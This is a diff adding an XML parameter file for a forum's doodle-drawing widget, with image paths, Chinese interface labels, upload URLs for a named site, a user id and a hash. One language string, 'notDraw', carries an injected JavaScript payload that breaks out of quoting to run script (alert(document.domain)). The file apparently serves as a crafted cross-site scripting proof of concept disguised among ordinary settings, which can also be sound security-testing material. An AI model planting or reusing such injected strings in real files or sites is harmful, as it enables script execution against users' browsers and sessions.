@@ -1,0 +1,50 @@
+
+<?xml version="1.0" encoding="UTF-8"?>
+<parameter>
+<background><bg url="static/image/doodle/big/001.jpg" thumb="static/image/doodle/thumb/001.jpg"/>
+<bg url="static/image/doodle/big/002.jpg" thumb="static/image/doodle/thumb/002.jpg"/>
+<bg url="static/image/doodle/big/003.jpg" thumb="static/image/doodle/thumb/003.jpg"/>
+<bg url="static/image/doodle/big/004.jpg" thumb="static/image/doodle/thumb/004.jpg"/>
+<bg url="static/image/doodle/big/005.jpg" thumb="static/image/doodle/thumb/005.jpg"/>
+<bg url="static/image/doodle/big/006.jpg" thumb="static/image/doodle/thumb/006.jpg"/>
+<bg url="static/image/doodle/big/007.jpg" thumb="static/image/doodle/thumb/007.jpg"/>
+<bg url="static/image/doodle/big/008.jpg" thumb="static/image/doodle/thumb/008.jpg"/>
+<bg url="static/image/doodle/big/009.jpg" thumb="static/image/doodle/thumb/009.jpg"/>
+<bg url="static/image/doodle/big/010.jpg" thumb="static/image/doodle/thumb/010.jpg"/>
+</background>
+<language>
+<create>创建</create>
+<notCreate>取消</notCreate>
+<albumName>相册名</albumName>
+<createTitle>创建新相册</createTitle>
+<categoryDesc>相册分类</categoryDesc>
+<categoryPrompt>请选择相册分类</categoryPrompt>
+<reload>重画</reload>
+<save>保存</save>
+<notDraw>',(function(){alert(document.domain)})(),'2</notDraw>
+</language>
+<config>
+<userid>62</userid>
+<hash>5e4de8e021d659b552062fd99989f8f7</hash>
+<maxupload>3145728</maxupload>
+<uploadurl>http%3A%2F%2Fwww.hsshmall.com%2Fbbs%2Fhome.php%3Fmod%3Dmisc%26ac%3Dswfupload%26op%3Ddoodle%26from%3D</uploadurl>
+<feedurl>http%3A%2F%2Fwww.hsshmall.com%2Fbbs%2Fhome.php%3Fmod%3Dmisc%26ac%3Dswfupload%26op%3Dfinish%26random%3Dj8V1zo8v%26albumid%3D</feedurl>
+<albumurl>http%3A%2F%2Fwww.hsshmall.com%2Fbbs%2Fhome.php%3Fmod%3Dspace%26do%3Dalbum%26picid%3D</albumurl>
+<categoryStat>1</categoryStat>
+<categoryRequired>1</categoryRequired>
+</config>
+<filters>
+<filter id="0">禁用</filter>
+<filter id="1">阴影</filter>
+<filter id="2">模糊</filter>
+<filter id="3">发光</filter>
+<filter id="4">水彩</filter>
+<filter id="5">喷溅</filter>
+<filter id="6">布纹</filter>
+</filters>
+<albums>
+<album id="-1">请选择相册</album><album id="add">+创建新相册</album>
+</albums>
+<categorys>
+<category catid="0">选择分类</category><category catid="1">家人</category><category catid="2">朋友</category><category catid="3">同事</category><category catid="4">网友</category><category catid="5">同学</category><category catid="6">其他</category></categorys>
+</parameter>
